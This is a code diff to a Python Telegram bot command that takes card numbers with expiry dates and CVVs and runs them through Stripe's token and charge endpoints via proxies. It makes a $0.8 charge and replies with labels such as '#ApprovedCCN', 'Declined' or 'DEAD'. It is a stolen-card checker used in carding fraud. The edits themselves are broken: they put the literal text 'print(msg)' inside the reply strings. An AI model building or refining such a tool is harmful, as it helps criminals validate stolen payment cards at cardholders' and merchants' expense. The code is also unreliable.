@@ -349,6 +349,8 @@ async def ch(message: types.Message):
         rx = session.post('https://api.stripe.com/v1/tokens',
                           data=load, headers=header)
         token = rx.json()['id']
+        res = rx.json()
+        msg = res['message']
         LastF = f'************{ccn[-4:]}'
         
         payload = {
@@ -368,7 +370,7 @@ async def ch(message: types.Message):
             return await message.reply(f'''
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ Request rate limit exceeded.
-<b>MSG</b>➟ {ri.text}
+<b>MSG</b>➟ print(msg)
 <b>PROXY-IP</b> <code>{b}</code>
 <b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
 <b>CKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
@@ -379,7 +381,7 @@ async def ch(message: types.Message):
             return await message.reply(f'''
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ API Key provided
-<b>MSG</b>➟ {ri.text}
+<b>MSG</b>➟ print(msg)
 <b>PROXY-IP</b> <code>{b}</code>
 <b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
 <b>CKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
@@ -389,13 +391,15 @@ async def ch(message: types.Message):
 
          ri = session.post('https://api.stripe.com/v1/charges', data=payload,
                           headers=head)
+         ris = ri.json()
+         msg1 = ris['message']
          toc = time.perf_counter()
 
          if 'Payment complete' in ri.text:
             return await message.reply(f'''
 ✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ Charge 0.8$✅
-<b>MSG</b>➟ {ri.text}
+<b>MSG</b>➟ Payment complete!
 <b>PROXY-IP</b> <code>{b}</code>
 <b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
 <b>CKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
@@ -406,7 +410,7 @@ async def ch(message: types.Message):
             return await message.reply(f'''
 ✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ #ApprovedCCN
-<b>MSG</b>➟ {ri.text}
+<b>MSG</b>➟ print(msg1)
 <b>PROXY-IP</b> <code>{b}</code>
 <b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
 <b>CKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
@@ -416,7 +420,7 @@ async def ch(message: types.Message):
             return await message.reply(f'''
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ Request rate limit exceeded.
-<b>MSG</b>➟ {ri.text}
+<b>MSG</b>➟ print(msg1)
 <b>PROXY-IP</b> <code>{b}</code>
 <b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
 <b>CKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
@@ -427,7 +431,7 @@ async def ch(message: types.Message):
             return await message.reply(f'''
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ API Key provided
-<b>MSG</b>➟ {ri.text}
+<b>MSG</b>➟ print(msg1)
 <b>PROXY-IP</b> <code>{b}</code>
 <b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
 <b>CKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
@@ -438,7 +442,7 @@ async def ch(message: types.Message):
             return await message.reply(f'''
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ Insufficient_funds
-<b>MSG</b>➟ {ri.text}
+<b>MSG</b>➟ print(msg1)
 <b>PROXY-IP</b> <code>{b}</code>
 <b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
 <b>CKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
@@ -449,7 +453,7 @@ async def ch(message: types.Message):
             return await message.reply(f'''
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ Declined
-<b>MSG</b>➟ {ri.text}
+<b>MSG</b>➟ print(msg1)
 <b>PROXY-IP</b> <code>{b}</code>
 <b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
 <b>CKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
@@ -459,7 +463,7 @@ async def ch(message: types.Message):
         await message.reply(f'''
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ DEAD
-<b>MSG</b>➟ {ri.text}
+<b>MSG</b>➟ print(msg1)
 <b>PROXY-IP</b> <code>{b}</code>
 <b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
 <b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
